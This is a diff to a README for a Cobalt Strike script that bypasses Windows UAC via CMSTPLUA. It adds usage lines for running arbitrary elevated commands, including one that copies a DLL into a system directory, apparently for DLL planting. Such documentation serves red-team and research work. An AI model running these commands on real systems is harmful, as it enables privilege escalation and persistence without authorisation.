@@ -28,9 +28,17 @@ Clone this repository first. Then review the code, compile from source and use i
 
 **Usage**
 
-Load the `UACBypassCMSTPLUA.cna` script using the Cobalt Strike Script Manager. Then use the command below to execute the exploit.
+Load the `UACBypassCMSTPLUA.cna` script using the Cobalt Strike Script Manager. Then use the command below to execute a command while bypassing UAC.
 
-    $ uac_bypass_cmstplua
+    $ uac_bypass_cmstplua [FILE] [PARAMETERS]
+
+For example, to copy a file use:
+
+    $ uac_bypass_cmstplua powershell Copy-Item C:\temp\BluetoothApis.dll C:\System32\Windows\BluetoothApis.dll
+
+To show a `whoami` on screen:
+
+    $ uac_bypass_cmstplua cmd /k whoami
 
 ## Warning
 
